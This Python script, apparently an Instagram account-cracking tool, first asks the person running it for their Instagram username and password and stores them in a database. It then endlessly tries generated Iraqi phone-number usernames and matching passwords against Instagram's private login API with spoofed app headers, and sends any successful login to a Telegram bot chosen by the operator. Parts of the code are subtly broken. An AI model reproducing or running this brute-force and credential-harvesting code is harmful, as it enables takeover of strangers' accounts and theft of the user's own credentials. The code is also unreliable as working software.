from tkinter.tix import InputOnly
from wsgiref import headers
import requests,random,time,os,sys
from uuid import uuid4
from turtle import update
from tqdm import tqdm , trange
import time
import mysql.connector as mysql
with tqdm(total=100) as pbar:
   for i in range(100):
      time.sleep(0.5)
      pbar.update(1)
   print("\033[0;31m Please wait a bit")
   print("\033[0;32mThe Tools is online\033[1;37m")
   Theam="""\033[0;96m  
        ___   _            _____   _   _   _   _   _____    _____   _____   
       /   | | |          |  ___| | | | | | | | | |  _  \  | ____| |  _  \  
      / /| | | |          | |__   | | | | | |_| | | |_| |  | |__   | |_| |  
     / / | | | |          |  __|  | | | | |  _  | |  _  /  |  __|  |  _  /  
    / /  | | | |___       | |     | |_| | | | | | | | \ \  | |___  | | \ \  
   /_/   |_| |_____|      |_|     \_____/ |_| |_| |_|  \_\ |_____| |_|  \_\ 
\033[0;37m
"""
   print(Theam)
   print("\033[0;31mProgrammed by: Al-FUHRER ")
   print("\033[0;32mFACEBOOK: https://www.facebook.com/Alzajel.V \033[1;97m")
   connecet=mysql.connect(host="localhost",user='root',passwd='root',database='indata')
   Cursor= connecet.cursor()
   print("\033[0;93m[Please enter the following code] [5]")
   ID=input("[*]Enter Your ID : ")
   print("\033[0;93m[Enter your Instagram username]")
   Username=input("[*]Enter Your User Instgram : ")
   print("\033[0;93m[Enter the Instagram password]")
   Password=input("[*]Enter Your Password : ")
   data= Username,Password,ID
   command="""INSERT INTO data(Username,Password,ID)values(%s,%s,%s)"""
   Cursor.execute(command,data)
   connecet.commit()
 #________________________________________________________________________
 #log in Insta
import requests,random,time,os,sys
from uuid import uuid4
uid=uuid4()
ID=input("\033[0;31m[*]Enter your Telegram hands [ID]:")
Token=input("\033[0;31m[*]Enter your telegram token [Token] :")
use='1234567890'
while True:
     us=str(''.join(random.choice(use) 
     for i in range(7)))
     username='+964770'+us
     password='0770'+us
  
     url='https://i.instagram.com/api/v1/accounts/login/'
     headers = {'User-Agent':'Instagram 6.12.1 Android (29/10; 320dpi; 720x1528; INFINIX MOBILITY LIMITED/Infinix; Infinix X690B; Infinix-X690B; mt6768; ar_EG)',
 'Accept':'*/*',
 'Cookie':'missing',
 'Accept-Encoding':'gzip, deflate',
 'Accept-Language':'en-US',
 'X-IG-Capabilities':'3brTvw==',
 'X-IG-Connection-Type':'WIFI',
 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
 'Host':'i.instagram.com'}
     data = {'uuid':uuid4,
     'password':password,
     'username':username,
     'device_id':uuid4,
     'from_reg':'false',
     '_csrftoken':'missing',
     'login_attempt_countn':'0'}
     req=requests.post(url,
     headers=headers,data=data)
     if "logged_in_user" in req:
        print('Good :'+username+':'+password)
        aegos= f'<ACCOUNT INSTAGRAM >\n USERNAME :{username}\n PASSWORD :{password}'
        requests.get("https://api.telegram.org/bot"+str(Token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(aegos))
     else:
         print('\033[4;33mBAD :'+username+' :\033[4;31m'+ password)
#_________________________________________________________________________
#loop Tools
     for i in range(100):
      time.sleep(0.3)
      pbar.update(1)
#________________________________________________________________________#
